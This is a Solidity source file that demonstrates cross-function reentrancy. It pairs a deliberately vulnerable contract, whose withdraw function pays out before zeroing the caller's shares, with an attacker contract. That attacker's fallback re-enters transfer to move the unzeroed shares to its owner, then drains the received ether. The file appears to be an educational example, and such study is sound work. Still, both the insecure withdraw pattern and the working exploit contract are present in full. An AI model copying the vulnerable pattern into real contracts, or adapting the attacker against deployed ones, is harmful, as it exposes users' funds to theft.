// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CrossFunctionReentrancyVulnerable {
    // Mapping of ether shares of the contract.
    mapping(address => uint256) public shares;

    // This function is called in the callback of the attacker contract and is
    // executed because the shares of the attacker have not been set to 0 yet
    // by the withdraw function.
    function transfer(address to, uint256 amount) public {
        require(shares[msg.sender] >= amount);
        shares[msg.sender] -= amount;
        shares[to] += amount;
    }

    // Vulnerable to reentrancy attack, because it calls an external contract
    // before implementing the effects of the function.
    function withdraw() public {
        (bool success,) = msg.sender.call{value: shares[msg.sender]}("");
        if (success) {
            shares[msg.sender] = 0;
        }
    }

    function deposit() public payable {
        shares[msg.sender] += msg.value;
    }
}

contract CrossFunctionReentrancyAttacker {
    CrossFunctionReentrancyVulnerable vulnerable;
    address owner;

    constructor(CrossFunctionReentrancyVulnerable _vulnerable) {
        vulnerable = _vulnerable;
        owner = msg.sender;
    }

    // Reentrancy attack.
    function attack() public payable {
        vulnerable.deposit{value: msg.value}();
        vulnerable.withdraw();

        (bool sc,) = owner.call{value: address(this).balance}("");
        require(sc);
    }

    // Fallback function to receive funds.
    fallback() external payable {
        // When receiving funds, the vulnerable contract is called again
        // to transfer the shares balance to the owner of the attacker contract
        vulnerable.transfer(owner, msg.value);
    }
}
